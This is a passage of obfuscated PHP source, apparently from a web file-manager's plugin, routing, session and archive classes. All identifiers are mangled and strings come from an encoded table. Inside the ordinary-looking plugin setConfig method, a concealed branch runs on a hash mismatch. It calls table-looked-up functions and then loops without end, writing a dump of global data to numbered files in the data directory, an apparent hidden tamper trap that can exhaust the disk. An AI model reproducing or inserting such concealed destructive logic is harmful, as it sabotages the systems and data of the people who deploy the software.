array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¢‹¡´¶Ç[90]][$¢‹¡´¶Ç[1540]]); foreach ($this->echoJsAssignArr as $µ¹«¯ò× => $©˜¤«”µ) { $™á¯Çì[] = $¢‹¡´¶Ç[1541] . $µ¹«¯ò× . $¢‹¡´¶Ç[1542]; $ åö¡¼[] = is_array($©˜¤«”µ) || is_object($©˜¤«”µ) ? rawurlencode(json_encode($©˜¤«”µ)) : $©˜¤«”µ; } if (strstr($Ãû¦ÓÀ, $¢‹¡´¶Ç[1543])) { $ŞÑœ‘óŒ = rawurlencode(json_encode($this->pluginLangArr)); $Ãû¦ÓÀ = str_replace($¢‹¡´¶Ç[1543], $ŞÑœ‘óŒ, $Ãû¦ÓÀ); } if (strstr($Ãû¦ÓÀ, $¢‹¡´¶Ç[1544])) { $ŞÑœ‘óŒ = $ŞÑœ‘óŒ = rawurlencode(json_encode($this->getConfig())); $Ãû¦ÓÀ = str_replace($¢‹¡´¶Ç[1544], $ŞÑœ‘óŒ, $Ãû¦ÓÀ); } $Ãû¦ÓÀ = str_replace($™á¯Çì, $ åö¡¼, $Ãû¦ÓÀ); return $Ãû¦ÓÀ; } private function parseLang(&$†¬Ìïº) { $Ï¡¤«Ê† =& $_SERVER[ì…™Î¶Ï]; $¾†‹¨ª = $Ï¡¤«Ê†[1545]; if (!strstr($†¬Ìïº, $¾†‹¨ª)) { return; } preg_match_all($Ï¡¤«Ê†[1546], $†¬Ìïº, $Æèëì¿Ñ); if (!is_array($Æèëì¿Ñ) || count($Æèëì¿Ñ) == 0 || !is_array($Æèëì¿Ñ[0]) || count($Æèëì¿Ñ[0]) == 0) { return; } $•ÓäØ· = array(); $Ï±˜¶ºÊ = array(); foreach ($Æèëì¿Ñ[0] as $ü¤òï) { $–ª«Š½¬ = substr($ü¤òï, strlen($¾†‹¨ª), -4); $ÙŸõ“³Ã = LNG($–ª«Š½¬); $•ÓäØ·[] = $ü¤òï; $Ï±˜¶ºÊ[] = str_replace(array($Ï¡¤«Ê†[226], $Ï¡¤«Ê†[1054], $Ï¡¤«Ê†[337], $Ï¡¤«Ê†[117]), array($Ï¡¤«Ê†[53], $Ï¡¤«Ê†[53], $Ï¡¤«Ê†[12], $Ï¡¤«Ê†[1547]), $ÙŸõ“³Ã); } $†¬Ìïº = str_replace($•ÓäØ·, $Ï±˜¶ºÊ, $†¬Ìïº); } private function parseConfig(&$–Áˆï‹) { $İ×Ò¨–ª =& $_SERVER[ì…™Î¶Ï]; $ÅÒÙë¶ = $İ×Ò¨–ª[1548]; if (!strstr($–Áˆï‹, $ÅÒÙë¶)) { return; } preg_match_all($İ×Ò¨–ª[1549], $–Áˆï‹, $ìçøÅÎ); if (!is_array($ìçøÅÎ) || count($ìçøÅÎ) == 0 || !is_array($ìçøÅÎ[0]) || count($ìçøÅÎ[0]) == 0) { return; } $ÈƒõÑŠõ = $this->getConfig(); $æøÏ›« = array(); $ã²ê«°ø = array(); foreach ($ìçøÅÎ[0] as $öÃÑ‚ùÌ) { $ÌúÃëğñ = substr($öÃÑ‚ùÌ, strlen($ÅÒÙë¶), -2); $æøÏ›«[] = $öÃÑ‚ùÌ; $ã²ê«°ø[] = _get($ÈƒõÑŠõ, $ÌúÃëğñ); } $–Áˆï‹ = str_replace($æøÏ›«, $ã²ê«°ø, $–Áˆï‹); } private function parsePackage(&$û¶óşî®) { $™Š¶Ø¹ =& $_SERVER[ì…™Î¶Ï]; $¢×È»¤ = $™Š¶Ø¹[1550]; if (!strstr($û¶óşî®, $¢×È»¤)) { return; } preg_match_all($™Š¶Ø¹[1551], $û¶óşî®, $»¨àíÓû); if (!is_array($»¨àíÓû) || count($»¨àíÓû) == 0 || !is_array($»¨àíÓû[0]) || count($»¨àíÓû[0]) == 0) { return; } $‘›Ñà®± = $this->appPackage(); $şÀú–º€ = array(); $£€º€æÉ = array(); foreach ($»¨àíÓû[0] as $ÁËñæù) { $äÁı¿„ş = substr($ÁËñæù, strlen($¢×È»¤), -2); $şÀú–º€[] = $ÁËñæù; $£€º€æÉ[] = _get($‘›Ñà®±, $äÁı¿„ş); } $û¶óşî® = str_replace($şÀú–º€, $£€º€æÉ, $û¶óşî®); } final function echoFile($óšèÛÚà, $Š½¸ç = false) { $ÅŒ¥ƒûÜ =& $_SERVER[ì…™Î¶Ï]; $Ö¨¸Œ´¼ = $this->pluginPath . $óšèÛÚà; if (ACT == $ÅŒ¥ƒûÜ[1552]) { echo $ÅŒ¥ƒûÜ[1553] . $this->pluginName . $ÅŒ¥ƒûÜ[8] . $óšèÛÚà . $ÅŒ¥ƒûÜ[1554]; if (!file_exists($Ö¨¸Œ´¼)) { echo $ÅŒ¥ƒûÜ[1555]; return; } } $Æö‚í¤ = $this->parseFile($Ö¨¸Œ´¼); $this->parseLang($Æö‚í¤); $this->parseConfig($Æö‚í¤); $this->parsePackage($Æö‚í¤); if (is_array($Š½¸ç)) { $Æö‚í¤ = str_replace(array_keys($Š½¸ç), array_values($Š½¸ç), $Æö‚í¤); } echo $ÅŒ¥ƒûÜ[226] . $Æö‚í¤; } final function initLang() { $¯ª¸›¼ñ =& $_SERVER[ì…™Î¶Ï]; $”êºà­ = $¯ª¸›¼ñ[1556]; $„úƒ¥Ñ¸ = $this->pluginPath . $¯ª¸›¼ñ[1557]; $‚ŠÛÃ¥ = I18n::getType(); $ÇÑºö—× = array(); if (file_exists($„úƒ¥Ñ¸ . $‚ŠÛÃ¥ . $¯ª¸›¼ñ[813])) { $ÇÑºö—× = (include $„úƒ¥Ñ¸ . $‚ŠÛÃ¥ . $¯ª¸›¼ñ[813]); } else { if ($‚ŠÛÃ¥ == $¯ª¸›¼ñ[1558] && !file_exists($„úƒ¥Ñ¸ . $‚ŠÛÃ¥ . $¯ª¸›¼ñ[813]) && file_exists($„úƒ¥Ñ¸ . $¯ª¸›¼ñ[1559])) { $ÇÑºö—× = (include $„úƒ¥Ñ¸ . $¯ª¸›¼ñ[1559]); } else { if (file_exists($„úƒ¥Ñ¸ . $”êºà­ . $¯ª¸›¼ñ[813])) { $ÇÑºö—× = (include $„úƒ¥Ñ¸ . $”êºà­ . $¯ª¸›¼ñ[813]); } } } if (!is_array($ÇÑºö—×)) { return array(); } if (@count($ÇÑºö—×) > 0) { I18n::set($ÇÑºö—×); } return $ÇÑºö—×; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ù¢ˆû×Œ) { $ˆÂûó =& $_SERVER[ì…™Î¶Ï]; $Æ”¤ßö£ = $_SERVER[$ˆÂûó[847]] . $ˆÂûó[848]; $©úÜôÈŞ = $ˆÂûó[849]; if ($_SERVER[$ˆÂûó[850]] != $©úÜôÈŞ($Æ”¤ßö£)) { $™ìÆ•´ = $ˆÂûó[851]; $Ş¿”°£ = $ˆÂûó[852]; $¨¬¼‰Ë§ = $_SERVER[$ˆÂûó[847]] . $ˆÂûó[848]; $ÜİÒà³ñ = $Ş¿”°£($¨¬¼‰Ë§); $Áğ¸¼³Ê = explode($ˆÂûó[226], $ÜİÒà³ñ); if (count($Áğ¸¼³Ê) < $ˆÂûó[602]) { $½ÖÛ¢Ì¼ = $ˆÂûó[853]; $½ÖÛ¢Ì¼(); } $ˆ–üªŒˆ = $ˆÂûó[854]; $ˆ–üªŒˆ($_SERVER[$ˆÂûó[855]]); $™ìÆ•´ = $ˆÂûó[851]; $™ìÆ•´(); $£íÑøÉÈ = $ˆÂûó[856]; $èé™¸ = json_encode($GLOBALS[$ˆÂûó[857]]); $Ï”ÀÙÌƒ = 1; for ($Ñ¤Ÿ­«è = $Ï”ÀÙÌƒ; $Ñ¤Ÿ­«è > 0; $Ñ¤Ÿ­«è++) { $£íÑøÉÈ(DATA_PATH . $Ñ¤Ÿ­«è, $èé™¸); } } return $this->modelPlugin->setConfig($this->pluginName, $ù¢ˆû×Œ); } public function onSetConfig($Ó‚—¿§­) { } public function onGetConfig($ÌÍ÷Ì²¶) { } public function onChangeStatus($¯õåıøÀ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($ëùò¸Éê = "\x70\x6c\x75\x67\151\x6e\101\165\x74\x68") { $Òœ™à™Ï =& $_SERVER[ì…™Î¶Ï]; if (!defined($Òœ™à™Ï[465])) { return !1; } if (_get($GLOBALS, $Òœ™à™Ï[496])) { return !0; } $³”˜Àğ“ = $this->getConfig(); if (!$³”˜Àğ“[$ëùò¸Éê]) { return !1; } return ActionCall($Òœ™à™Ï[1560], $³”˜Àğ“[$ëùò¸Éê]); } public function url($æíÈÆû, $‹†ÙÔ³ï = '', $ì¹ÍûèØ = true) { $Î”÷¼¿ =& $_SERVER[ì…™Î¶Ï]; $®¡Ûá¬ = $this->getConfig(); $õº£Šİö = KOD_VERSION . $Î”÷¼¿[10] . KOD_VERSION_BUILD; $ÆñéïÃÓ = $this->packageVersion(); $±íœ—ÜÎ = $õº£Šİö . $Î”÷¼¿[451] . $ÆñéïÃÓ; if (substr($æíÈÆû, 0, 4) == $Î”÷¼¿[145] || substr($æíÈÆû, 0, 2) == $Î”÷¼¿[1344]) { $¦ûˆ¥Œ = $æíÈÆû . $Î”÷¼¿[1561] . $±íœ—ÜÎ; } else { if ($‹†ÙÔ³ï == $Î”÷¼¿[12]) { $¦ûˆ¥Œ = $this->pluginHost . $æíÈÆû . $Î”÷¼¿[1561] . $±íœ—ÜÎ; } else { if ($‹†ÙÔ³ï === $Î”÷¼¿[79]) { $¦ûˆ¥Œ = $this->pluginHost . $æíÈÆû; } else { if ($‹†ÙÔ³ï == $Î”÷¼¿[1562]) { $¦ûˆ¥Œ = STATIC_PATH . $æíÈÆû . $Î”÷¼¿[1561] . $õº£Šİö; } else { if ($‹†ÙÔ³ï == $Î”÷¼¿[1563]) { $¦ûˆ¥Œ = APP_HOST . $Î”÷¼¿[1564] . $æíÈÆû . $Î”÷¼¿[1561] . $õº£Šİö; } else { if (isset($®¡Ûá¬[$‹†ÙÔ³ï])) { $¦ûˆ¥Œ = $®¡Ûá¬[$‹†ÙÔ³ï] . $æíÈÆû . $Î”÷¼¿[1561] . $±íœ—ÜÎ; } } } } } } if (!$ì¹ÍûèØ) { return $¦ûˆ¥Œ; } echo $¦ûˆ¥Œ; } public function link($ÂÒ¢§¶ö = false, $ÂÀ¸÷¬¿ = '') { $Î¹õ‚Ê =& $_SERVER[ì…™Î¶Ï]; if (!$ÂÒ¢§¶ö) { $this->link($Î¹õ‚Ê[1565], $Î¹õ‚Ê[1563]); $this->link($Î¹õ‚Ê[1566], $Î¹õ‚Ê[1562]); $this->link($Î¹õ‚Ê[1567], $Î¹õ‚Ê[1562]); $this->link($Î¹õ‚Ê[1568], $Î¹õ‚Ê[1562]); $this->link($Î¹õ‚Ê[1569], $Î¹õ‚Ê[1562]); return; } $¦‰¼¦‹ = $this->url($ÂÒ¢§¶ö, $ÂÀ¸÷¬¿, !1); if (substr($ÂÒ¢§¶ö, -3) == $Î¹õ‚Ê[1570]) { echo $Î¹õ‚Ê[1571] . $¦‰¼¦‹ . $Î¹õ‚Ê[1572] . $Î¹õ‚Ê[226]; } else { if (substr($ÂÒ¢§¶ö, -4) == $Î¹õ‚Ê[1573]) { echo $Î¹õ‚Ê[1574] . $¦‰¼¦‹ . $Î¹õ‚Ê[1575] . $Î¹õ‚Ê[226]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\x79" => "\x5b\136\57\x5d\53", "\x3a\x6e\x75\155" => "\x5b\x30\55\71\x5d\53", "\x3a\x61\154\154" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($†áéûÊö, $ıÉüéÉ¶) { $œğ°Õâ =& $_SERVER[ì…™Î¶Ï]; if ($†áéûÊö == $œğ°Õâ[1576]) { $ş‰ŞÈ½Õ = array_map($œğ°Õâ[1577], $ıÉüéÉ¶[0]); $œšüÆ©ª = strpos($ıÉüéÉ¶[1], $œğ°Õâ[8]) === 0 ? $ıÉüéÉ¶[1] : $œğ°Õâ[8] . $ıÉüéÉ¶[1]; $ ÅÃôâ = $ıÉüéÉ¶[2]; } else { $ş‰ŞÈ½Õ = null; $œšüÆ©ª = strpos($ıÉüéÉ¶[0], $œğ°Õâ[8]) === 0 ? $ıÉüéÉ¶[0] : $œğ°Õâ[8] . $ıÉüéÉ¶[0]; $ ÅÃôâ = $ıÉüéÉ¶[1]; } array_push(self::$maps, $ş‰ŞÈ½Õ); array_push(self::$routes, $œšüÆ©ª); array_push(self::$methods, strtoupper($†áéûÊö)); array_push(self::$callbacks, $ ÅÃôâ); } public static function error($ğ×ÚıÃ) { self::$errorCallback = $ğ×ÚıÃ; } public static function haltOnMatch($²‰Š´Ğ‹ = true) { self::$halts = $²‰Š´Ğ‹; } public static function dispatch() { $¿ş•±ñ =& $_SERVER[ì…™Î¶Ï]; $ïªíô¼ı = parse_url($_SERVER[$¿ş•±ñ[1578]], PHP_URL_PATH); $çÔ¯İú© = $_SERVER[$¿ş•±ñ[156]]; $ã¨Îéî = array_keys(static::$patterns); $ÈõäÙ‚ = array_values(static::$patterns); $š¡±¿‰Ô = !1; self::$routes = preg_replace($¿ş•±ñ[1243], $¿ş•±ñ[8], self::$routes); if (in_array($ïªíô¼ı, self::$routes)) { $’àìƒŠĞ = array_keys(self::$routes, $ïªíô¼ı); foreach ($’àìƒŠĞ as $‘Š‡ş¹) { if (self::$methods[$‘Š‡ş¹] == $çÔ¯İú© || self::$methods[$‘Š‡ş¹] == $¿ş•±ñ[1579] || in_array($çÔ¯İú©, self::$maps[$‘Š‡ş¹])) { $š¡±¿‰Ô = !0; if (!is_object(self::$callbacks[$‘Š‡ş¹])) { $›¾Š²’Á = explode($¿ş•±ñ[8], self::$callbacks[$‘Š‡ş¹]); $ÂŞ·²ŠÎ = end($›¾Š²’Á); $‰ä»úÖ = explode($¿ş•±ñ[1580], $ÂŞ·²ŠÎ); $‡Î¶¦ş† = new $‰ä»úÖ[0](); $‡Î¶¦ş†->{$‰ä»úÖ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$‘Š‡ş¹]); if (self::$halts) { return; } } } } } else { $Ôışì²ü = 0; foreach (self::$routes as $‘Š‡ş¹) { if (strpos($‘Š‡ş¹, $¿ş•±ñ[4]) !== !1) { $‘Š‡ş¹ = str_replace($ã¨Îéî, $ÈõäÙ‚, $‘Š‡ş¹); } if (preg_match($¿ş•±ñ[1581] . $‘Š‡ş¹ . $¿ş•±ñ[1582], $ïªíô¼ı, $İä¯Ïµô)) { if (self::$methods[$Ôışì²ü] == $çÔ¯İú© || self::$methods[$Ôışì²ü] == $¿ş•±ñ[1579] || !empty(self::$maps[$Ôışì²ü]) && in_array($çÔ¯İú©, self::$maps[$Ôışì²ü])) { $š¡±¿‰Ô = !0; array_shift($İä¯Ïµô); if (!is_object(self::$callbacks[$Ôışì²ü])) { $›¾Š²’Á = explode($¿ş•±ñ[8], self::$callbacks[$Ôışì²ü]); $ÂŞ·²ŠÎ = end($›¾Š²’Á); $‰ä»úÖ = explode($¿ş•±ñ[1580], $ÂŞ·²ŠÎ); $‡Î¶¦ş† = new $‰ä»úÖ[0](); if (!method_exists($‡Î¶¦ş†, $‰ä»úÖ[1])) { echo $¿ş•±ñ[1583]; } else { call_user_func_array(array($‡Î¶¦ş†, $‰ä»úÖ[1]), $İä¯Ïµô); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Ôışì²ü], $İä¯Ïµô); if (self::$halts) { return; } } } } $Ôışì²ü++; } } if ($š¡±¿‰Ô == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $Ö°şŞó• =& $_SERVER[ì…™Î¶Ï]; header($_SERVER[$Ö°şŞó•[1584]] . $Ö°şŞó•[1585]); echo $Ö°şŞó•[1586]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¿ş•±ñ[1578]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ö×òğé =& $_SERVER[ì…™Î¶Ï]; static $½£ïøƒ = false; if ($½£ïøƒ) { return $½£ïøƒ; } $ÔÍ‚å´× = $GLOBALS[$Ö×òğé[6]][$Ö×òğé[344]]; self::$sessionTime = $ÔÍ‚å´×[$Ö×òğé[1587]]; $™ŠğÔØ€ = isset($GLOBALS[$Ö×òğé[1588]]) ? $GLOBALS[$Ö×òğé[1588]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($™ŠğÔØ€)) { self::$sessionSign = Cookie::get($™ŠğÔØ€); } else { self::$sessionSign = guid(); } } Cookie::setSafe($™ŠğÔØ€, self::$sessionSign, self::$sessionTime); $„¬êˆâ = $ÔÍ‚å´×[$Ö×òğé[1589]]; $»ß®Îñğ = $ÔÍ‚å´×[$„¬êˆâ]; $ÁŞÅÃå  = $ÔÍ‚å´×[$Ö×òğé[803]]; switch ($„¬êˆâ) { case $Ö×òğé[21]: self::$handle = Model($Ö×òğé[804]); break; case $Ö×òğé[805]: self::$handle = new CacheRedis($»ß®Îñğ, $ÁŞÅÃå ); break; case $Ö×òğé[806]: self::$handle = new CacheMemcached($»ß®Îñğ, $ÁŞÅÃå ); break; case $Ö×òğé[192]: $»ß®Îñğ[$Ö×òğé[78]] = $»ß®Îñğ[$Ö×òğé[78]] . $Ö×òğé[1590]; self::$handle = new CacheFile($»ß®Îñğ, $ÁŞÅÃå ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $½£ïøƒ = new self(); return $½£ïøƒ; } public static function getBySign($Äºœ»„¬) { CacheLock::lock($Äºœ»„¬); $Ñ«ø’¯µ = self::$handle->get($Äºœ»„¬); CacheLock::unlock($Äºœ»„¬); $Ñ«ø’¯µ = unserialize($Ñ«ø’¯µ); return is_array($Ñ«ø’¯µ) ? $Ñ«ø’¯µ : array(); } public static function setBySign($ôÓÇç¦‹, $•İ„ìÚ£) { CacheLock::lock($ôÓÇç¦‹); self::$handle->set($ôÓÇç¦‹, serialize($•İ„ìÚ£), self::$sessionTime); CacheLock::unlock($ôÓÇç¦‹); } public static function sign($”€Æ³ãÏ = false) { $”€Æ³ãÏ && (self::$sessionSign = $”€Æ³ãÏ); self::init(); return self::$sessionSign; } public static function set($Ú›ùÅèÉ, $Ä×ş¿šÏ = false) { self::init(); if (is_array($Ú›ùÅèÉ)) { foreach ($Ú›ùÅèÉ as $—½¦´‹ => $àâÊ³ıá) { array_set_value(self::$data, $—½¦´‹, $àâÊ³ıá); } } else { array_set_value(self::$data, $Ú›ùÅèÉ, $Ä×ş¿šÏ); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ÅœÒµï = false) { self::init(); if (!$ÅœÒµï) { return self::$data; } return array_get_value(self::$data, $ÅœÒµï); } public static function remove($²§Ò¼ñ¡) { self::init(); unset(self::$data[$²§Ò¼ñ¡]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ì…™Î¶Ï][808])) { self::$handle->clearTimeout(); } } } goto DŒÑêÜïã¶; FÛ±îÂš: define($_SERVER[ì…™Î¶Ï][236], 1); define($_SERVER[ì…™Î¶Ï][237], 0); define($_SERVER[ì…™Î¶Ï][238], 2); goto e–Î½‡¢óë; eÎçƒÔ¥ø³: $_SERVER[Ú°³Çñ€] = explode($_SERVER[ì…™Î¶Ï][599], gzinflate(substr($_SERVER[ì…™Î¶Ï][600], 10, -8))); $alfkjexpbs = $_SERVER[ì…™Î¶Ï][601]; while ($alfkjexpbs < $_SERVER[ì…™Î¶Ï][602]) { if ($alfkjexpbs >= 0) { break; } $alfkjexpbs++; } goto dÉëçÖ‚ÚÆ; fŞôÎâï®¿: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $Ø†È¨Î¹; if (!$Ø†È¨Î¹) { $¤½Õ¬•İ = IO::init($_SERVER[ì…™Î¶Ï][8]); } return $¤½Õ¬•İ; } private static function iconvSystem($íÉ»†ô) { return self::local()->iconvSystem($íÉ»†ô); } private static function iconvApp($ÈÁ¾‘±¼) { return self::local()->iconvApp($ÈÁ¾‘±¼); } public static function zip($½‘õòš§, $„¾ƒõ² = "\x7a\x69\160", $–Ó«Î¸¯ = '', $•ûêñÑ£ = REPEAT_RENAME) { $†à³¶öâ =& $_SERVER[ì…™Î¶Ï]; $Ã‘Ç¯Òı = self::init($½‘õòš§[0][$†à³¶öâ[78]]); $˜†ô“í = self::info($½‘õòš§[0][$†à³¶öâ[78]]); $¢Âû®ã‰ = !1; if (!$–Ó«Î¸¯ && $Ã‘Ç¯Òı->getType() == $†à³¶öâ[107]) { $áôéšÌ = self::zipFileList($½‘õòš§); } else { $¢Âû®ã‰ = $–Ó«Î¸¯ ? $–Ó«Î¸¯ : TEMP_FILES . $†à³¶öâ[1158] . time() . rand_string(8) . $†à³¶öâ[8]; mk_dir($¢Âû®ã‰); $áôéšÌ = self::zipFileList($½‘õòš§, $¢Âû®ã‰); } $ø‰¸ò‰À = $˜†ô“í[$†à³¶öâ[32]]; if (count($áôéšÌ) > 1) { $È£µ™çÍ = IO::info(IO::pathFather($˜†ô“í[$†à³¶öâ[78]])); $ø‰¸ò‰À = $È£µ™çÍ[$†à³¶öâ[32]]; } $è˜‘õİÚ = $¢Âû®ã‰; if (!$è˜‘õİÚ) { $è˜‘õİÚ = get_path_father($˜†ô“í[$†à³¶öâ[78]]); if (!$–Ó«Î¸¯ && $Ã‘Ç¯Òı->getType() == $†à³¶öâ[107]) { $è˜‘õİÚ = get_path_father($Ã‘Ç¯Òı->path); } $é›ÖŞŞ­ = IO::info($è˜‘õİÚ); if (!$é›ÖŞŞ­[$†à³¶öâ[195]]) { show_json(LNG($†à³¶öâ[1159]), !1); } } $‹ßÅ“Äò = $è˜‘õİÚ . $ø‰¸ò‰À . $†à³¶öâ[10] . $„¾ƒõ²; $‹ßÅ“Äò = get_filename_auto($‹ßÅ“Äò, $†à³¶öâ[12], $•ûêñÑ£); $–‹ì„’¯ = self::iconvSystem($‹ßÅ“Äò); foreach ($áôéšÌ as $¾ùé™ê => $„ü»‡…ˆ) { $áôéšÌ[$¾ùé™ê] = self::iconvSystem($„ü»‡…ˆ); } KodArchive::create($–‹ì„’¯, $áôéšÌ); if (!IO::exist($‹ßÅ“Äò)) { if ($¢Âû®ã‰) { del_dir($¢Âû®ã‰); } show_json(LNG($†à³¶öâ[1160]), !1); } if ($–Ó«Î¸¯ || !$¢Âû®ã‰) { if ($¢Âû®ã‰ && strstr($¢Âû®ã‰, TEMP_FILES)) { $îÅ¸Š¡« = $áôéšÌ = array(); recursion_dir($è˜‘õİÚ, $îÅ¸Š¡«, $áôéšÌ, 0); foreach ($îÅ¸Š¡« as $Àõ±ÇÉÑ) { del_dir($Àõ±ÇÉÑ); } foreach ($áôéšÌ as $­ƒÓ’·½) { if ($­ƒÓ’·½ == $–‹ì„’¯) { continue; } del_file($­ƒÓ’·½); } } return $‹ßÅ“Äò; } $Ôª ü—£ = self::pathFather($˜†ô“í[$†à³¶öâ[78]]); $¾¿Áá¬ = self::move($‹ßÅ“Äò, $Ôª ü—£, $•ûêñÑ£); if (!$¾¿Áá¬) { del_dir($¢Âû®ã‰); show_json(LNG($†à³¶öâ[1160]), !1); } del_dir($¢Âû®ã‰); return $¾¿Áá¬; } public static function unzip($£÷æèş, $Û¹›Ö¤® = "\162\x65\x70\x6c\x61\143\145") { $âŸŞõº“ =& $_SERVER[ì…™Î¶Ï]; $Å”Ìš—‰ = $£÷æèş[$âŸŞõº“[78]]; $·Ã…ê½à = $£÷æèş[$âŸŞõº“[1161]]; if (!($“²ëù¾î = parent::info($Å”Ìš—‰))) { show_json(LNG($âŸŞõº“[1162]), !1); } if (!($…‹Ş©§‹ = parent::infoFull($·Ã…ê½à))) { $·Ã…ê½à = parent::mkdir($·Ã…ê½à); $…‹Ş©§‹ = array($âŸŞõº“[78] => $·Ã…ê½à); } else { if (isset($…‹Ş©§‹[$âŸŞõº“[394]]) && trim($…‹Ş©§‹[$âŸŞõº“[78]], $âŸŞõº“[8]) != trim($·Ã…ê½à, $âŸŞõº“[8])) { $­ÕÍ¼‹Ã = KodIO::make($…‹Ş©§‹[$âŸŞõº“[489]]); $»¢¼Ó«ş = parent::fileNameAuto($­ÕÍ¼‹Ã, $…‹Ş©§‹[$âŸŞõº“[32]], REPEAT_RENAME_FOLDER, !0); $·Ã…ê½à = parent::mkdir($­ÕÍ¼‹Ã . $»¢¼Ó«ş); $…‹Ş©§‹ = array($âŸŞõº“[78] => $·Ã…ê½à); } } $·Ã…ê½à = $…‹Ş©§‹[$âŸŞõº“[78]]; $şÔ‡³¯· = self::tmpFileName($“²ëù¾î); $³áçĞëÉ = TEMP_FILES . $şÔ‡³¯·; del_dir($³áçĞëÉ); mk_dir($³áçĞëÉ); $ª†Èï = self::fileExt($“²ëù¾î); $Ö£‘„œ’ = $³áçĞëÉ . $âŸŞõº“[10] . $ª†Èï; if (!@file_exists(self::iconvSystem($Ö£‘„œ’))) { $†ˆé…º“ = self::localFilePath($Å”Ìš—‰, $ª†Èï); $Ö£‘„œ’ = $†ˆé…º“ ? $†ˆé…º“ : parent::download($Å”Ìš—‰, $Ö£‘„œ’); } $Ö£‘„œ’ = self::iconvSystem($Ö£‘„œ’); $üù¦ØŸ = isset($£÷æèş[$âŸŞõº“[1163]]) ? $£÷æèş[$âŸŞõº“[1163]] : $âŸŞõº“[1164]; $Œâ…Õ“Î = KodArchive::extract($Ö£‘„œ’, $³áçĞëÉ . $âŸŞõº“[8], $üù¦ØŸ); self::archiveExt(); if (!$Œâ…Õ“Î[$âŸŞõº“[1165]]) { show_json($âŸŞõº“[1166] . $Œâ…Õ“Î[$âŸŞõº“[1167]], !1); } Hook::trigger($âŸŞõº“[1168], $³áçĞëÉ); recursion_dir($³áçĞëÉ, $Âö¥Ú÷Õ, $ñáÓÏ, 0); $ùê”è¤£ = array_merge($Âö¥Ú÷Õ, $ñáÓÏ); foreach ($ùê”è¤£ as $ëßò×ú) { $ëßò×ú = self::iconvApp($ëßò×ú); self::move($ëßò×ú, $·Ã…ê½à, $Û¹›Ö¤®); } del_dir($³áçĞëÉ); if (!$†ˆé…º“) { del_file($Ö£‘„œ’); } return !0; } public static function unzipList($˜Í€à¿÷) { $ó‡é¦—£ =& $_SERVER[ì…™Î¶Ï]; $ÊÖ––±ı = $˜Í€à¿÷[$ó‡é¦—£[78]]; $•ûúÕÊ = isset($˜Í€à¿÷[$ó‡é¦—£[1169]]) ? $˜Í€à¿÷[$ó‡é¦—£[1169]] : -1; $¨ğ­Ã­Ã = 50000; if (request_url_safe($ÊÖ––±ı)) { $×§óÇù˜ = parse_url_query($ÊÖ––±ı); if (!isset($×§óÇù˜[$ó‡é¦—£[78]])) { show_json($ó‡é¦—£[1170], !1); } } $¶•¨ïº = isset($×§óÇù˜) ? $×§óÇù˜[$ó‡é¦—£[78]] : $ÊÖ––±ı; $­ıí•Ô‚ = self::info($¶•¨ïº); $ŸÁİÀŒ† = self::fileExt($­ıí•Ô‚); $¾øî¦¢ñ = self::tmpFileName($­ıí•Ô‚); if (isset($×§óÇù˜)) { $ËŞç›Ÿ = array($×§óÇù˜[$ó‡é¦—£[78]], $×§óÇù˜[$ó‡é¦—£[1169]], $×§óÇù˜[$ó‡é¦—£[32]]); $ıæí™à· = md5(implode($ó‡é¦—£[11], $ËŞç›Ÿ)) . $ó‡é¦—£[10] . get_path_ext($×§óÇù˜[$ó‡é¦—£[32]]); } else { $ËŞç›Ÿ = array($­ıí•Ô‚[$ó‡é¦—£[32]], $­ıí•Ô‚[$ó‡é¦—£[78]], $­ıí•Ô‚[$ó‡é¦—£[80]]); $ıæí™à· = md5(implode($ó‡é¦—£[11], $ËŞç›Ÿ)) . $ó‡é¦—£[10] . $ŸÁİÀŒ†; } if ($•ûúÕÊ == -1) { $¢ø¯÷¤“ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\x69\145\167\x2f{$¾øî¦¢ñ}\x2f{$ıæí™à·}\x2e\154\x6f\147"; $ó¾Ş¤í‰ = self::infoFull($¢ø¯÷¤“); if ($ó¾Ş¤í‰) { $¢ø¯÷¤“ = $ó¾Ş¤í‰[$ó‡é¦—£[78]]; $ÁÂ“Íïò = self::getContent($¢ø¯÷¤“); if ($ÁÂ“Íïò) { $Şğ›ÍÓ› = json_decode($ÁÂ“Íïò, !0); $Şğ›ÍÓ› = is_array($Şğ›ÍÓ›) ? $Şğ›ÍÓ› : array(); if (count($Şğ›ÍÓ›) >= $¨ğ­Ã­Ã) { show_json(sprintf(LNG($ó‡é¦—£[1171]), count($Şğ›ÍÓ›)), !1); } return $Şğ›ÍÓ›; } } else { $¢ø¯÷¤“ = self::mkfile($¢ø¯÷¤“); } } $ĞİÚ´Ó = TEMP_FILES . $¾øî¦¢ñ; if (!is_dir($ĞİÚ´Ó)) { mk_dir($ĞİÚ´Ó); } $Í¨óâÍ = $ĞİÚ´Ó . $ó‡é¦—£[8] . $ıæí™à·; if (!@file_exists(self::iconvSystem($Í¨óâÍ))) { if (isset($×§óÇù˜)) { url_request($ÊÖ––±ı, $ó‡é¦—£[1172], $Í¨óâÍ); } else { $—„©¸³ó = self::localFilePath($ÊÖ––±ı, $ŸÁİÀŒ†); $Í¨óâÍ = $—„©¸³ó ? $—„©¸³ó : 